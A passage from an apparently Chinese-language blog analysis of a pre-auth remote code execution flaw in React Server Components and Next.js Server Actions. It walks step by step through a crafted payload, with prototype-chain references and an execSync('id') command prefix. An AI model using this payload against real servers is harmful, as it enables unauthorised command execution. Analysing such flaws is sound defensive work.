4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────────────┐
│ 字段: "then": "$1:__proto__:then"                                       │
├─────────────────────────────────────────────────────────────────────────┤
│ 目的: 让伪造对象拥有真正的 Chunk.prototype.then 方法                      │
│                                                                          │
│ 解析过程:                                                                │
│   "$1:__proto__:then"                                                   │
│     ↓ 解析 $1                                                           │
│   getChunk(1).value = "$@0" 的解析结果 = Chunk 0 对象本身                │
│     ↓ 访问 __proto__                                                    │
│   Chunk 0 对象.__proto__ = ReactPromise.prototype                       │
│     ↓ 访问 then                                                         │
│   ReactPromise.prototype.then = 真正的 then 方法 ✓                      │
│                                                                          │
│ 结果: 伪造对象的 then 属性 = ReactPromise.prototype.then                 │
│       这让伪造对象成为一个"合法"的 thenable                              │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ 字段: "status": "resolved_model"                                        │
├─────────────────────────────────────────────────────────────────────────┤
│ 目的: 当 then() 被调用时，触发 initializeModelChunk()                    │
│                                                                          │
│ 原理: ReactPromise.prototype.then 的实现:                               │
│   switch (this.status) {                                                │
│       case "resolved_model":                                            │
│           initializeModelChunk(this);  // ← 会被触发！                  │
│           break;                                                        │
│   }                                                                     │
│                                                                          │
│ 结果: await 伪造对象时，会解析其 value 字段                              │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ 字段: "reason": -1                                                      │
├─────────────────────────────────────────────────────────────────────────┤
│ 目的: 某些代码路径检查此字段，-1 避免类型错误                            │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ 字段: "value": "{\"then\":\"$B1337\"}"                                  │
├─────────────────────────────────────────────────────────────────────────┤
│ 目的: 内层 payload，被 initializeModelChunk 解析                         │
│                                                                          │
│ 内容: {"then": "$B1337"}                                                │
│                                                                          │
│ 解析后: { then: &lt;$B1337 的结果&gt; }                                       │
│                                                                          │
│ $B1337 的处理:                                                          │
│   case 'B':                                                             │
│       return response._formData.get(response._prefix + "1337");         │
│                                                                          │
│ 由于 _formData.get = Function, _prefix = "恶意代码;"                    │
│ 所以: Function("恶意代码;1337") → 返回一个函数                          │
│                                                                          │
│ 最终: value 解析为 { then: &lt;恶意函数&gt; }                                 │
│       这是一个 thenable，被 await 时会执行 then()                       │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ 字段: "_response": {...}                                                │
├─────────────────────────────────────────────────────────────────────────┤
│ 目的: 伪造的 Response 对象，initializeModelChunk 会使用它               │
│                                                                          │
│ 子字段:                                                                 │
│                                                                          │
│ "_prefix": "throw new Error(require('child_process').execSync('id')...);│
│   → 要执行的恶意代码（不以分号结尾，因为会拼接 ID）                      │
│                                                                          │
│ "_chunks": "$Q2"                                                        │
│   → 指向空数组，避免遍历 _chunks 时报错                                  │
│                                                                          │
│ "_formData": {"get": "$1:constructor:constructor"}                      │
│   → get 属性 = Function 构造函数                                        │
│   → 解析: getChunk(1) → Chunk0对象 → constructor → Object → constructor │
│                                      → Function                          │
└─────────────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h4 id="532-chunk-1---原始-chunk-引用"><span class="me-2">5.3.2 Chunk 1 - 原始 Chunk 引用</span><a href="#532-chunk-1---原始-chunk-引用" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="dl">"</span><span class="s2">$@0</span><span class="dl">"</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────────────┐
│ 解析: "$@0"                                                             │
├─────────────────────────────────────────────────────────────────────────┤
│ $@ 前缀表示"获取原始 Chunk 对象"                                        │
│                                                                          │
│ 返回值: Chunk 0 的 ReactPromise 对象本身（不是解析后的值）               │
│                                                                          │
│ 结构:                                                                   │
│ ReactPromise {                                                          │
│     status: "resolved_model",                                           │
│     value: '{"then":"$1:__proto__:then",...}',                         │
│     _response: Response {...},                                          │
│     __proto__: ReactPromise.prototype  ← 可访问原型链！                 │
│ }                                                                       │
│                                                                          │
│ 用途:                                                                   │
│   1. $1:__proto__:then → 获取 ReactPromise.prototype.then               │
│   2. $1:constructor:constructor → 获取 Function 构造函数               │
└─────────────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h4 id="533-chunk-2---空数组"><span class="me-2">5.3.3 Chunk 2 - 空数组</span><a href="#533-chunk-2---空数组" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">[]</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────────────┐
│ 用途: 作为 _chunks 的值（通过 $Q2 引用）                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ 原因: initializeModelChunk 可能会迭代 _response._chunks                 │
│       提供空数组避免迭代时出现类型错误                                   │
└─────────────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h3 id="54-利用流程---逐步执行分析"><span class="me-2">5.4 利用流程 - 逐步执行分析</span><a href="#54-利用流程---逐步执行分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="步骤-1-请求进入-nextjs"><span class="me-2">步骤 1: 请求进入 Next.js</span><a href="#步骤-1-请求进入-nextjs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="c1">// next/dist/server/app-render/action-handler.js</span>
<span class="k">export</span> <span class="k">async</span> <span class="kd">function</span> <span class="nf">handleAction</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
    <span class="c1">// 1. 检查是否是 Server Action 请求</span>
    <span class="kd">const</span> <span class="nx">actionId</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">next-action</span><span class="dl">'</span><span class="p">];</span>  <span class="c1">// "x"</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">actionId</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>  <span class="c1">// 不是 Action 请求</span>

    <span class="c1">// 2. ⚠️ 关键: 先反序列化，再验证 Action ID</span>
    <span class="kd">let</span> <span class="nx">boundActionArguments</span><span class="p">;</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">isMultipartAction</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 使用 Busboy 解析 multipart 数据</span>
        <span class="kd">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">parseMultipartFormData</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
        <span class="c1">// 调用 Flight 协议反序列化</span>
        <span class="nx">boundActionArguments</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">decodeReplyFromBusboy</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
        <span class="c1">// ↑ 漏洞在这里触发，程序不会执行到下面</span>
    <span class="p">}</span>

    <span class="c1">// 3. 验证 Action ID（永远不会执行到）</span>
    <span class="kd">const</span> <span class="nx">action</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">getAction</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid Server Action</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>关键</strong>: 反序列化发生在验证 Action ID 之前，这是 Pre-auth 的原因。</p>

<h4 id="步骤-2-flight-协议开始解析"><span class="me-2">步骤 2: Flight 协议开始解析</span><a href="#步骤-2-flight-协议开始解析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">// react-server-dom-webpack/src/ReactFlightDOMServerNode.js</span>
<span class="kd">function</span> <span class="nf">decodeReplyFromBusboy</span><span class="p">(</span><span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 创建 Response 对象</span>
    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="nf">createResponse</span><span class="p">(</span><span class="nx">bundlerConfig</span><span class="p">,</span> <span class="nx">formData</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>

    <span class="c1">// 获取根 Chunk (ID=0)</span>
    <span class="kd">const</span> <span class="nx">root</span> <span class="o">=</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// 返回 root，它是一个 thenable</span>
    <span class="k">return</span> <span class="nx">root</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-3-getchunk-创建-chunk-0"><span class="me-2">步骤 3: getChunk 创建 Chunk 0</span><a href="#步骤-3-getchunk-创建-chunk-0" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// id = 0</span>
    <span class="kd">let</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_chunks</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>  <span class="c1">// undefined</span>

    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 从 FormData 获取数据</span>
        <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">);</span>
        <span class="c1">// data = '{"then":"$1:__proto__:then",...}'</span>

        <span class="c1">// 创建 Chunk</span>
        <span class="nx">chunk</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReactPromise</span><span class="p">(</span>
            <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">,</span>  <span class="c1">// status</span>
            <span class="nx">data</span><span class="p">,</span>              <span class="c1">// value = 恶意 JSON 字符串</span>
            <span class="mi">0</span><span class="p">,</span>                 <span class="c1">// reason = id</span>
            <span class="nx">response</span>           <span class="c1">// response</span>
        <span class="p">);</span>

        <span class="nx">response</span><span class="p">.</span><span class="nx">_chunks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">chunk</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">chunk</span><span class="p">;</span>  <span class="c1">// 返回 Chunk 0</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-4-await-触发-then"><span class="me-2">步骤 4: await 触发 then()</span><a href="#步骤-4-await-触发-then" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c1">// 在 action-handler.js 中</span>
<span class="kd">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">decodeReplyFromBusboy</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
<span class="c1">//            ↑ await 一个 thenable 会调用其 then 方法</span>

<span class="c1">// 实际执行:</span>
<span class="nx">chunk0</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">);</span>
<span class="c1">// chunk0 是真正的 ReactPromise，所以调用 ReactPromise.prototype.then</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-5-initializemodelchunk-被调用"><span class="me-2">步骤 5: initializeModelChunk 被调用</span><a href="#步骤-5-initializemodelchunk-被调用" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c1">// ReactPromise.prototype.then</span>
<span class="nx">Chunk</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">then</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// "resolved_model"</span>
        <span class="k">case</span> <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">:</span>
            <span class="nf">initializeModelChunk</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>  <span class="c1">// ← 触发！</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="c1">// initializeModelChunk</span>
<span class="kd">function</span> <span class="nf">initializeModelChunk</span><span class="p">(</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">_response</span><span class="p">;</span>  <span class="c1">// 真正的 Response</span>
    <span class="kd">const</span> <span class="nx">json</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>  <span class="c1">// '{"then":"$1:__proto__:then",...}'</span>

    <span class="c1">// 解析 JSON</span>
    <span class="kd">const</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="nf">parseModel</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">json</span><span class="p">);</span>
    <span class="c1">// parsed = 伪造的 Chunk 对象</span>

    <span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">fulfilled</span><span class="dl">"</span><span class="p">;</span>
    <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-6-解析-chunk-0-的-json---获取-chunkprototypethen"><span class="me-2">步骤 6: 解析 Chunk 0 的 JSON - 获取 Chunk.prototype.then</span><a href="#步骤-6-解析-chunk-0-的-json---获取-chunkprototypethen" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="c1">// parseModel 解析 JSON，遇到 "$1:__proto__:then"</span>
<span class="kd">function</span> <span class="nf">parseModelString</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// value = "$1:__proto__:then"</span>

    <span class="k">if </span><span class="p">(</span><span class="nx">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">$</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 解析链式引用</span>
        <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">// "1:__proto__:then"</span>
        <span class="kd">var</span> <span class="nx">colonIdx</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">);</span>  <span class="c1">// 1</span>
        <span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">ref</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">colonIdx</span><span class="p">));</span>  <span class="c1">// 1</span>
        <span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="nx">colonIdx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// "__proto__:then"</span>

        <span class="c1">// 获取 Chunk 1</span>
        <span class="kd">var</span> <span class="nx">chunk1</span> <span class="o">=</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="c1">// Chunk 1 的 value = '"$@0"'</span>
        <span class="c1">// 解析后 = Chunk 0 对象本身</span>

        <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nf">resolveChunk</span><span class="p">(</span><span class="nx">chunk1</span><span class="p">);</span>  <span class="c1">// Chunk 0 对象</span>

        <span class="c1">// 遍历路径 "__proto__:then"</span>
        <span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">);</span>  <span class="c1">// ["__proto__", "then"]</span>

        <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">of</span> <span class="nx">keys</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>  <span class="c1">// ⚠️ 没有 hasOwnProperty 检查！</span>
        <span class="p">}</span>
        <span class="c1">// value["__proto__"] = ReactPromise.prototype</span>
        <span class="c1">// value["then"] = ReactPromise.prototype.then</span>

        <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>  <span class="c1">// 返回真正的 then 方法！</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-7-解析-_response_formdataget---获取-function"><span class="me-2">步骤 7: 解析 _response._formData.get - 获取 Function</span><a href="#步骤-7-解析-_response_formdataget---获取-function" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">// 解析 "$1:constructor:constructor"</span>
<span class="kd">var</span> <span class="nx">chunk1Value</span> <span class="o">=</span> <span class="nf">resolveChunk</span><span class="p">(</span><span class="nf">getChunk</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>  <span class="c1">// Chunk 0 对象</span>
<span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">chunk1Value</span><span class="p">;</span>

<span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">];</span>  <span class="c1">// Object (因为 Chunk 0 是对象)</span>
<span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">];</span>  <span class="c1">// Function!</span>

<span class="c1">// 现在 _formData.get = Function 构造函数</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-8-构建完成的伪造对象"><span class="me-2">步骤 8: 构建完成的伪造对象</span><a href="#步骤-8-构建完成的伪造对象" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="c1">// 解析完成后，Chunk 0 的 value 变成:</span>
<span class="kd">const</span> <span class="nx">fakeChunk</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">then</span><span class="p">:</span> <span class="nx">ReactPromise</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">then</span><span class="p">,</span>  <span class="c1">// 真正的 then 方法</span>
    <span class="na">status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">reason</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="na">value</span><span class="p">:</span> <span class="dl">'</span><span class="s1">{"then":"$B1337"}</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">_response</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">_prefix</span><span class="p">:</span> <span class="dl">"</span><span class="s2">throw new Error(require('child_process').execSync('id').toString());</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">_chunks</span><span class="p">:</span> <span class="p">[],</span>
        <span class="na">_formData</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">get</span><span class="p">:</span> <span class="nb">Function</span>  <span class="c1">// Function 构造函数！</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-9-外层-await-触发伪造对象的-then"><span class="me-2">步骤 9: 外层 await 触发伪造对象的 then</span><a href="#步骤-9-外层-await-触发伪造对象的-then" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">// initializeModelChunk 完成后，chunk0.value = fakeChunk</span>
<span class="c1">// 但 fakeChunk 也是 thenable（有 then 方法）</span>

<span class="c1">// 当处理完成后，会 await fakeChunk</span>
<span class="k">await</span> <span class="nx">fakeChunk</span><span class="p">;</span>

<span class="c1">// 这会调用:</span>
<span class="nx">fakeChunk</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">);</span>
<span class="c1">// 由于 fakeChunk.then === ReactPromise.prototype.then</span>
<span class="c1">// 等价于:</span>
<span class="nx">ReactPromise</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">then</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">fakeChunk</span><span class="p">,</span> <span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-10-第二次-initializemodelchunk"><span class="me-2">步骤 10: 第二次 initializeModelChunk</span><a href="#步骤-10-第二次-initializemodelchunk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">// ReactPromise.prototype.then 检查 this.status</span>
<span class="c1">// fakeChunk.status === "resolved_model"</span>
<span class="c1">// 所以再次调用 initializeModelChunk</span>

<span class="kd">function</span> <span class="nf">initializeModelChunk</span><span class="p">(</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// chunk = fakeChunk</span>
    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">_response</span><span class="p">;</span>  <span class="c1">// 伪造的 _response！</span>
    <span class="kd">const</span> <span class="nx">json</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>  <span class="c1">// '{"then":"$B1337"}'</span>

    <span class="c1">// 解析这个 JSON</span>
    <span class="kd">const</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="nf">parseModel</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">json</span><span class="p">);</span>
    <span class="c1">// 遇到 "$B1337"...</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="步骤-11-b-处理器触发-rce"><span class="me-2">步骤 11: $B 处理器触发 RCE</span><a href="#步骤-11-b-处理器触发-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">// parseModelString 解析 "$B1337"</span>
<span class="kd">function</span> <span class="nf">parseModelString</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// value = "$B1337"</span>

